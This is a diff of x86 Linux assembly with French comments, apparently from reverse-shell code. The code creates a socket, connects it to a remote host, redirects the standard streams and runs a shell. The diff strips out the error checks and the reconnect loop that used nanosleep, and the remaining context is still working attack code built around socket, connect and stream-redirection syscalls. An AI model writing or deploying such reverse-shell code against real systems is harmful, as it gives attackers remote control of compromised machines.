@@ -27,10 +27,6 @@ socket_create:
     mov ecx, esp        ; ecx pointe vers les arguments
     int 0x80
     
-    ; Vérifier si la création du socket a réussi
-    test eax, eax
-    js retry_connection ; Si erreur, attendre et réessayer
-    
     mov edi, eax        ; Sauvegarder le descripteur de fichier du socket
 
 socket_connect:
@@ -56,40 +52,6 @@ socket_connect:
     
     mov ecx, esp        ; ecx pointe vers les arguments
     int 0x80
-    
-    ; Vérifier si la connexion a réussi
-    test eax, eax
-    js connection_failed
-    
-    ; La connexion a réussi, rediriger les flux et exécuter le shell
-    jmp redirect_streams
-
-connection_failed:
-    ; Fermer le socket actuel avant de réessayer
-    mov eax, 6          ; syscall close
-    mov ebx, edi        ; descripteur de fichier du socket
-    int 0x80
-    
-    ; Attendre avant de réessayer
-    jmp retry_connection
-
-retry_connection:
-    ; Configurer la structure timespec pour nanosleep
-    ; struct timespec {
-    ;     time_t tv_sec;  /* secondes */
-    ;     long   tv_nsec; /* nanosecondes */
-    ; };
-    mov dword [timespec], RETRY_SECONDS  ; tv_sec
-    mov dword [timespec+4], 0            ; tv_nsec
-    
-    ; Appeler nanosleep
-    mov eax, 162         ; syscall nanosleep
-    mov ebx, timespec    ; adresse de la structure timespec
-    mov ecx, 0           ; NULL (paramètre non utilisé)
-    int 0x80
-    
-    ; Réessayer la connexion
-    jmp socket_create
 
 redirect_streams:
     ; Étape 4 : Rediriger stdin (0)
